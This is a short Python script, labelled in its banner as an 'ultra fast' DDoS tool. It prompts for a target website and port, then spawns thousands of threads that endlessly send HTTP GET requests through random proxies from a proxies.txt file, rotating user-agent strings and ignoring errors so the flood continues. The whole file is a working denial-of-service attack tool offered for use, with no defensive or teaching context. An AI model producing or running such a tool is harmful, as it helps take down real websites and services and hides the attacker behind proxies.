
import threading
import socket
import random
import time
import sys

print("""
    #########################################################
    #                                                       #
    #             MADE BY :- VIKAS_BHAGAT🚩                  #
    #        ULTRA FAST DDOS TOOL (10M+ THREADS)             #
    #                                                       #
    #########################################################
""")

# Configurations
target = input("TARGET WEBSITE (WITHOUT https://) : ").strip()
port = int(input("PORT [Default 80] : ") or 80)
thread_count = int(input("NUMBER OF THREADS [Example: 5000] : "))

# Load proxies
try:
    proxies = open('proxies.txt', 'r').read().splitlines()
except:
    print('[-] proxies.txt file not found.')
    sys.exit()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

def attack():
    while True:
        try:
            proxy = random.choice(proxies)
            ip, port_proxy = proxy.split(":")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, int(port_proxy)))
            
            req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: Keep-Alive\r\n\r\n"
            sock.sendall(req.encode())
            sock.close()
            print(f"[+] Attack Sent From Proxy: {proxy}")
        except Exception as e:
            # Skip errors to continue attack
            pass

# Start threads
for _ in range(thread_count):
    threading.Thread(target=attack, daemon=True).start()

while True:
    time.sleep(10)
